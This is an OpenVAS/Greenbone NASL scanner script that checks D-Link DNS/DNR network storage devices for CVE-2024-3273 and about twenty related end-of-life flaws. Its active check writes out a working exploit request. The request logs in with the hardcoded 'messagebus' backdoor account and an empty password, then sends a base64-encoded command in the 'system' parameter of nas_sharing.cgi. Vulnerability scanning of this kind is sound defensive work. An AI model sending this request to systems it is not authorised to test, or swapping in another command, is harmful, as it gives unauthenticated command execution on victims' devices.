# SPDX-FileCopyrightText: 2024 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE_PREFIX = "cpe:/o:dlink:dns";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.152068");
  script_version("2025-07-31T05:44:45+0000");
  script_tag(name:"last_modification", value:"2025-07-31 05:44:45 +0000 (Thu, 31 Jul 2025)");
  script_tag(name:"creation_date", value:"2024-04-09 07:53:09 +0000 (Tue, 09 Apr 2024)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-08-27 15:39:53 +0000 (Tue, 27 Aug 2024)");

  script_cve_id("CVE-2024-3272", "CVE-2024-3273", "CVE-2024-3274", "CVE-2024-7715",
                "CVE-2024-7828", "CVE-2024-7829", "CVE-2024-7830", "CVE-2024-7831",
                "CVE-2024-7832", "CVE-2024-7849", "CVE-2024-7922", "CVE-2024-8127",
                "CVE-2024-8128", "CVE-2024-8129", "CVE-2024-8130", "CVE-2024-8131",
                "CVE-2024-8132", "CVE-2024-8133", "CVE-2024-8134", "CVE-2024-8461");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("D-Link DNS/DNR Devices Multiple Vulnerabilities (SAP10383) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2024 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_dlink_dns_http_detect.nasl");
  script_mandatory_keys("d-link/dns/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Multiple D-Link DNS and DNR devices are prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.

  Note: This script checks for the presence of CVE-2024-3273 which indicates that the system is also
  affected by the other included CVEs.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - CVE-2024-3272: Backdoor through username and password exposure

  - CVE-2024-3273: Command injection through the system parameter

  - CVE-2024-3274: Information disclosure through unauthenticated CGI script access

  - CVE-2024-7715: Command injection through the argument filter in /cgi-bin/photocenter_mgr.cgi

  - CVE-2024-7828, CVE-2024-7829, CVE-2024-7830, CVE-2024-7831, CVE-2024-7832, CVE-2024-7849:
  Buffer Overflow

  - CVE-2024-7922, CVE-2024-8127, CVE-2024-8128, CVE-2024-8129, CVE-2024-8130, CVE-2024-8131,
  CVE-2024-8132, CVE-2024-8133, CVE-2024-8134, CVE-2024-8461: Command injection

  - CVE-2024-8461: Information disclosure in /cgi-bin/discovery.cgi");

  script_tag(name:"affected", value:"Various D-Link DNS and DNR devices. Please see the vendor
  advisory for a full list of affected devices.");

  script_tag(name:"solution", value:"No solution was made available by the vendor. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.

  The vendor states that the affected devices are EoL and recommends to immediately retire and
  replace such devices.");

  script_xref(name:"URL", value:"https://supportannouncement.us.dlink.com/security/publication.aspx?name=SAP10383");
  script_xref(name:"URL", value:"https://github.com/netsecfish/dlink");
  script_xref(name:"URL", value:"https://github.com/netsecfish/info_cgi");
  script_xref(name:"URL", value:"https://github.com/leetsun/IoT-Vuls/tree/main/Dlink-dns320/4");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www"))
  exit(0);

cpe = infos["cpe"];
port = infos["port"];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

vt_strings = get_vt_strings();
pattern = vt_strings["default_rand"];
payload = raw_string("echo", 0x09, pattern); # Needs a tab (0x09) to succeed.
enc_payload = base64(str: payload);

url = "/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=" + enc_payload;

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if (egrep(pattern: pattern, string: res)) {
  report = "It was possible to use the backdoor account to execute the command 'echo " + pattern +
           "' via " + http_report_vuln_url(port: port, url: url, url_only: TRUE) + '\n\nResult:\n\n' + chomp(res);
  security_message(port: port, data: report);
  exit(0);
}

exit(0); # nb: nas_sharing.cgi seems to be not always accessible. Maybe needs some special config.
